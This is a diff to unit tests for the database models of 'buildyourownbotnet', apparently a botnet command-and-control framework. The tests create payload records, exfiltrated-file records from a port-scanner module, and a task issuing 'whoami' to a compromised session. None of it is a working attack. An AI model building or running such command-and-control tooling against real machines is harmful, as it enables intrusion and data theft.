@@ -3,7 +3,7 @@ import pytest
 import uuid
 from datetime import datetime
 from buildyourownbotnet import db, bcrypt
-from buildyourownbotnet.models import User, Session, Payload, ExfiltratedFile
+from buildyourownbotnet.models import User, Session, Task, Payload, ExfiltratedFile
 from ..conftests import new_user, new_session
 
 
@@ -15,7 +15,7 @@ def test_new_user():
     """
     test_username = 'test_user'
     hashed_password = bcrypt.generate_password_hash('test_password').decode('utf-8')
-    new_user = User(username=test_username, password=hashed_password)
+    new_user = User(id=1, username=test_username, password=hashed_password)
     assert new_user.username == 'test_user'
     assert new_user.password != 'test_password'
 
@@ -56,11 +56,13 @@ def test_new_payload(new_user):
     when a new payload is created, 
     then check the payload metadata is stored in the database correctly.
     """
-    payload = Payload(filename='test', 
+    payload = Payload(id=1,
+                      filename='test', 
                       operating_system='linux2',
                       architecture='x32',
                       owner=new_user.username)
     assert isinstance(payload, Payload)
+    assert payload.id == 1
     assert payload.filename == 'test'
     assert payload.operating_system == 'linux2'
     assert payload.architecture == 'x32'
@@ -68,15 +70,37 @@ def test_new_payload(new_user):
 
 def test_new_exfiltrated_file(new_session):
     """
-    Given a new user and a new session for that user,
+    Given a session,
     when a new file is exfiltrated, 
     then check the exfiltrated file metadata is stored in the database correctly.
     """
-    exfiltrated_file = ExfiltratedFile(filename='test.txt',
+    exfiltrated_file = ExfiltratedFile(id=1,
+                                       filename='test.txt',
                                        session=new_session.uid,
                                        module='portscanner',
                                        owner=new_session.owner)
+    assert isinstance(exfiltrated_file, ExfiltratedFile)
+    assert exfiltrated_file.id == 1
     assert exfiltrated_file.filename == 'test.txt'
     assert exfiltrated_file.session == new_session.uid
     assert exfiltrated_file.module == 'portscanner'
     assert exfiltrated_file.owner == new_session.owner
+
+def test_new_task(new_session):
+    """
+    Given a session,
+    when a new task is created for that session, 
+    then check the task metadata is stored in the database correctly.
+    """
+    task = Task(id=1,
+                session=new_session.uid, 
+                task='whoami', 
+                issued=datetime.utcnow())
+    assert isinstance(task, Task)
+    assert task.id == 1
+    assert task.session == new_session.uid
+    assert task.task == 'whoami'
+    assert (datetime.utcnow() - task.issued).seconds <= 1
+    assert task.result is None
+    assert task.completed is None
+
